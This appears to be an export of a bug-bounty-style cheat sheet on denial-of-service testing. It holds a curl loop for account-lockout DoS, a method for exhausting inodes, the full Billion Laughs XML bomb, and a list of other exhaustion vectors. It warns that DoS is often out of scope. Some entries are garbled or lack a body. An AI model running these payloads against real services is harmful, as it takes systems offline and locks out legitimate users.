entries.title: What DoS / DDoS is and why to be careful
entries.body:
DoS means making a service unavailable (a flood of requests or exploiting a bug -> crash/degradation). DDoS is the same from multiple sources.
[!] Test DoS extremely carefully: it is often OUT-OF-SCOPE, can genuinely take down production and may cost you access. Check the program rules first.

entries.title: Account lockout DoS
entries.body: for i in {1..100}; do curl -X POST -d "username=user&password=wrong" <target_login_url>; done

entries.title: Inode exhaustion (No space left on device)
entries.body:
Make the application write files until you hit the filesystem inode limit -> "No space left on device". An alternative is to inflate a single file (SQLite DB, log) up to the maximum filesystem size.
FAT32 is limited to 4 GB per file (which is why it gets replaced with exFAT/NTFS).

entries.title: Maximum inodes by filesystem
entries.body: btrfs ext4 fat32 ntfs xfs zfs inodes

entries.title: Billion Laughs (XML bomb)
entries.body:
<?xml version="1.0"?>
<!DOCTYPE lolz [
<!ENTITY lol "lol">
<!ELEMENT lolz (#PCDATA)>
<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>

entries.title: GraphQL - deeply nested queries
Other exhaustion vectors
entries.body:
- Image Resizing - corrupted images with tampered headers (abnormal size / huge pixel count).
- SVG - an XML-based format -> try billion laughs.
- Regular Expression - ReDoS.
- Fork Bomb (see below).
